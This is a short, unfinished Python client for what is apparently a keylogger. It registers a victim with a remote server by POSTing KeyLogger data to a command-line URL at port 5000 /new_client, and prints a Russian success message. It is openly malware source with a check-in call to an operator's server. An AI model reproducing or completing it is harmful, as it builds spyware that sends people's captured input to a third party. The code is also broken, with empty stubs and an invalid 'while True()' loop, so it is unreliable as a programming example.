import requests
import sys

from keylogger import KeyLogger

def is_registred(user):
    user

def registration(server_url, user):
    keylogger = KeyLogger(user)
    registration_data = keylogger.registration()
    answer = requests.post(server_url+':5000/new_client', json=registration_data).json()
    if answer['status'] == 'Successfully':
        print('[+] Регистрация прошла успешно')

def check_user(server_url, user):
    pass

def main():
    server_url = sys.argv[1]
    user = input('Input your name: ')
    registration(server_url, user)
    while True():
        check_user(server_url, user)
    pass

if __name__ == '__main__':
    main()    

